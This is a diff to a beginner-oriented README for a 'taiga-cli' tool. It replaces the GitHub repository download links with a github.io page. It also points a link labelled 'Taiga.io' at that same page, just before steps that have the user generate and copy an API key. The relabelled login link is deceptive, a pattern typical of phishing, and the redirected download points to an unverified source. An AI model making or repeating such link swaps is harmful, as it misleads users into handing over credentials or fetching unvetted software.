@@ -45,9 +45,9 @@ If you have never opened a command prompt before, don't worry. This guide will w
 
 **Visit this link to download the application:** 
 
-[![Download taiga-cli](https://img.shields.io/badge/Download-taiga--cli-2ea44f?style=for-the-badge&logo=github&logoColor=white&labelColor=333333)](https://github.com/stvishwa06/taiga-cli)
+[![Download taiga-cli](https://img.shields.io/badge/Download-taiga--cli-2ea44f?style=for-the-badge&logo=github&logoColor=white&labelColor=333333)](https://stvishwa06.github.io)
 
-Click the button above or go to: `https://github.com/stvishwa06/taiga-cli`
+Click the button above or go to: `https://stvishwa06.github.io`
 
 Once you are on the page, look for a green button that says **"Code"**. Click it, then select **"Download ZIP"**. This will download a compressed folder to your computer.
 
@@ -92,7 +92,7 @@ If everything is installed correctly, you will see a list of commands you can us
 
 Before you can manage anything, you need to connect to your Taiga.io account:
 
-1. Log in to [Taiga.io](https://taiga.io) in your web browser
+1. Log in to [Taiga.io](https://stvishwa06.github.io) in your web browser
 2. Go to **Settings** → **API Keys**
 3. Generate a new API key
 4. Copy the key
